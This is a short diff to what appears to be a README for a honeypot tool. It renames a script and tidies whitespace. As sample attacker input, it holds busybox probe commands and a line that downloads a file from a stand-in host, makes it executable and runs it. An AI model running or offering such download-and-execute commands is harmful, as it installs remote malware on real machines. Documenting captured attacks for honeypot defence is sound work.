@@ -32,8 +32,8 @@ Samples are included for local and client/server deployments.
 
 ## Client/Local Mode
 
-	python honey.py
-	
+	python honeypot.py
+
 ## Server
 
 	python backend.py
@@ -54,7 +54,7 @@ which it should do automatically for local deployments.
 	nc; wget; /bin/busybox PEGOK
 	(dd bs=52 count=1 if=.s || cat .s)
 	/bin/busybox PEGOK
-	rm .s; wget http://example.com:4636/.i; chmod +x .i; ./.i; exit 
+	rm .s; wget http://example.com:4636/.i; chmod +x .i; ./.i; exit
 
 ## Images
 
